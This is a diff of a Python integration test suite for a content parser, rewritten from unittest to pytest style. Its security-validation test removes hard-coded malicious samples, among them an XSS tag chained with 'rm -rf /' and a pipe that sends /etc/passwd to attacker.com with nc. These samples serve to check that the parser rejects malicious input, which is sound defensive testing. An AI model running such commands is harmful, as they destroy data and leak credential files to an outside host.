@@ -5,63 +5,46 @@ Integration test for parsing messy content files.
 Tests the complete pipeline from messy input to standardized output.
 """
 
-import tempfile
 import unittest
-from pathlib import Path
 
 import pytest
 
-from warp_content_processor import ContentProcessor, ContentSplitter
+from tests.helpers import (
+    create_large_messy_content,
+    create_malicious_content_samples,
+    create_unicode_test_content,
+    extract_document_types,
+    read_mixed_content_file,
+    validate_output_yaml_files,
+)
+from warp_content_processor import ContentSplitter
 
 
-class TestMessyContentIntegration(unittest.TestCase):
+class TestMessyContentIntegration:
     """Integration tests for messy content parsing."""
 
-    def setUp(self):
-        """Set up test environment."""
-        self.test_dir = tempfile.mkdtemp()
-        self.output_dir = Path(self.test_dir) / "output"
-        self.fixtures_dir = Path(__file__).parent / "fixtures"
-        self.messy_content_file = self.fixtures_dir / "messy_mixed_content.yaml"
-
-    def tearDown(self):
-        """Clean up test environment."""
-        import shutil
-
-        shutil.rmtree(self.test_dir)
-
     @pytest.mark.timeout(30)
-    def test_parse_messy_mixed_content(self):
+    @pytest.mark.parametrize(
+        "expected_min_documents,expected_types",
+        [
+            (1, {"workflow", "prompt", "rule"}),  # Expected content types in messy file
+        ],
+    )
+    def test_parse_messy_mixed_content(self, messy_content_file, expected_min_documents, expected_types):
         """Test parsing of intentionally messy mixed content."""
-        content = self.messy_content_file.read_text()
+        content = read_mixed_content_file(messy_content_file)
         documents = ContentSplitter.split_content(content)
 
         # Should successfully parse despite formatting issues
-        self.assertGreater(len(documents), 0, "Should parse at least one document")
+        assert len(documents) >= expected_min_documents, "Should parse at least one document"
 
         # Check that we get the expected content types
-        types_found = [doc_type.value for doc_type, _ in documents]
+        types_found = extract_document_types(documents)
 
-        # Should find workflow content
-        self.assertIn(
-            "workflow",
-            types_found,
-            f"Should detect workflow content. Found types: {types_found}",
-        )
-
-        # Should find prompt content
-        self.assertIn(
-            "prompt",
-            types_found,
-            f"Should detect prompt content. Found types: {types_found}",
-        )
-
-        # Should find rule content
-        self.assertIn(
-            "rule",
-            types_found,
-            f"Should detect rule content. Found types: {types_found}",
-        )
+        # Verify all expected types are found
+        for expected_type in expected_types:
+            assert expected_type in types_found, \
+                f"Should detect {expected_type} content. Found types: {types_found}"
 
     @pytest.mark.timeout(30)
     def test_robust_parsing_with_syntax_errors(self):
@@ -88,10 +71,10 @@ class TestMessyContentIntegration(unittest.TestCase):
         documents = ContentSplitter.split_content(malformed_content)
 
         # Should return some results even with syntax errors
-        self.assertIsInstance(documents, list)
+        assert isinstance(documents, list)
 
         # At least one document should be parseable
-        self.assertGreater(len(documents), 0)
+        assert len(documents) > 0
 
     def test_normalize_poorly_formatted_workflow(self):
         """Test normalization of poorly formatted workflow."""
@@ -106,15 +89,15 @@ class TestMessyContentIntegration(unittest.TestCase):
         documents = ContentSplitter.split_content(messy_workflow)
 
         # Should parse successfully
-        self.assertEqual(len(documents), 1)
+        assert len(documents) == 1
         doc_type, doc_content = documents[0]
 
         # Should be detected as workflow
-        self.assertEqual(doc_type.value, "workflow")
+        assert doc_type.value == "workflow"
 
         # Content should be properly formatted YAML
-        self.assertIn("name:", doc_content)
-        self.assertIn("command:", doc_content)
+        assert "name:" in doc_content
+        assert "command:" in doc_content
 
     def test_mixed_markdown_yaml_parsing(self):
         """Test parsing of mixed Markdown and YAML content."""
@@ -145,132 +128,80 @@ class TestMessyContentIntegration(unittest.TestCase):
         documents = ContentSplitter.split_content(mixed_content)
 
         # Should parse multiple documents
-        self.assertGreaterEqual(len(documents), 2)
+        assert len(documents) >= 2
 
         # Should find workflow
-        types = [doc_type.value for doc_type, _ in documents]
-        self.assertIn("workflow", types)
+        types = extract_document_types(documents)
+        assert "workflow" in types
+
 
     @pytest.mark.timeout(60)
-    def test_end_to_end_processing_messy_content(self):
+    def test_end_to_end_processing_messy_content(self, messy_content_file, content_processor, output_dir):
         """Test complete end-to-end processing of messy content."""
-        if not self.messy_content_file.exists():
-            self.skipTest("Messy content fixture not found")
-
-        # Create processor
-        try:
-            processor = ContentProcessor(self.output_dir)
-        except Exception as e:
-            self.skipTest(f"Could not create processor: {e}")
-
         # Process the messy file
-        try:
-            results = processor.process_file(self.messy_content_file)
-        except Exception as e:
-            self.fail(f"Processing failed: {e}")
+        results = content_processor.process_file(messy_content_file)
 
         # Should get some results
-        self.assertIsInstance(results, list)
-        self.assertGreater(len(results), 0, "Should produce at least one result")
+        assert isinstance(results, list)
+        assert len(results) > 0, "Should produce at least one result"
 
-        # Check that output files were created
-        if self.output_dir.exists():
-            output_files = list(self.output_dir.rglob("*.yaml"))
-            if output_files:
-                # Verify output files are valid YAML
-                for output_file in output_files:
-                    try:
-                        import yaml
-
-                        with open(output_file) as f:
-                            yaml.safe_load(f)
-                    except yaml.YAMLError as e:
-                        self.fail(f"Output file {output_file} is not valid YAML: {e}")
-
-    def test_performance_with_large_messy_content(self):
+        # Check that output files were created and are valid
+        validation_errors = validate_output_yaml_files(output_dir)
+        assert not validation_errors, f"Output validation failed: {validation_errors}"
+    @pytest.mark.timeout(10)
+    @pytest.mark.parametrize(
+        "content_count,expected_documents,expected_type",
+        [
+            (50, 50, "workflow"),  # Large content test with 50 workflows
+        ],
+    )
+    def test_performance_with_large_messy_content(self, content_count, expected_documents, expected_type):
         """Test performance with large amounts of messy content."""
-        # Generate large messy content
-        large_messy_parts = []
+        large_messy_content = create_large_messy_content(count=content_count)
+        documents = ContentSplitter.split_content(large_messy_content)
 
-        for i in range(50):
-            # Intentionally messy formatting
-            large_messy_parts.append(
-                f"""
----
-name:Workflow {i}
-command:echo "test {i}"&&ls -la
-description:Generated workflow number {i}
-tags:test,generated,item-{i}
-shells:bash,zsh
-arguments:
--name:input
- description:Input for workflow {i}
- default_value:default-{i}
-"""
-            )
+        # Should find all expected documents
+        assert len(documents) == expected_documents
 
-        large_content = "\n".join(large_messy_parts)
-
-        # Should parse all documents within reasonable time
-        import time
-
-        start_time = time.time()
-
-        documents = ContentSplitter.split_content(large_content)
-
-        end_time = time.time()
-        parse_time = end_time - start_time
-
-        # Should complete within 5 seconds
-        self.assertLess(parse_time, 5.0, f"Parsing took too long: {parse_time:.2f}s")
-
-        # Should find all 50 workflows
-        self.assertEqual(len(documents), 50)
-
-        # All should be detected as workflows
-        for doc_type, _ in documents:
-            self.assertEqual(doc_type.value, "workflow")
+        # All should be detected as expected type
+        types = extract_document_types(documents)
+        assert len(types) == expected_documents
+        assert all(doc_type == expected_type for doc_type in types)
 
     def test_security_validation_in_messy_content(self):
         """Test that security validation works with messy content."""
-        malicious_messy_content = """
+        malicious_samples = create_malicious_content_samples()
+        malicious_messy_content = f"""
         ---
         name:Evil Workflow
-        command:<script>alert('xss')</script>&&rm -rf /
+        command:{malicious_samples['script_injection']}
         description:This tries to be malicious
         ---
         
         name:Another Evil One
-        command:cat /etc/passwd|nc attacker.com 1234
+        command:{malicious_samples['command_injection_pipe']}
         """
 
         # Security validation should catch this
         documents = ContentSplitter.split_content(malicious_messy_content)
 
         # Should return empty list due to security rejection
-        self.assertEqual(len(documents), 0, "Malicious content should be rejected")
+        assert len(documents) == 0, "Malicious content should be rejected"
 
     def test_unicode_handling_in_messy_content(self):
         """Test handling of Unicode characters in messy content."""
-        unicode_content = """
-        ---
-        name: Workflow with émojis 🚀
-        command: echo "Hello 世界"
-        description: Testing Unicode handling
-        tags: unicode, test, 国际化
-        ---
-        """
+        unicode_content = create_unicode_test_content()
 
         # Should handle Unicode correctly
         documents = ContentSplitter.split_content(unicode_content)
 
-        self.assertEqual(len(documents), 1)
+        assert len(documents) == 1
         doc_type, doc_content = documents[0]
 
         # Should preserve Unicode characters
-        self.assertIn("🚀", doc_content)
-        self.assertIn("世界", doc_content)
-        self.assertIn("国际化", doc_content)
+        assert "🚀" in doc_content
+        assert "世界" in doc_content
+        assert "国际化" in doc_content
 
 
 if __name__ == "__main__":
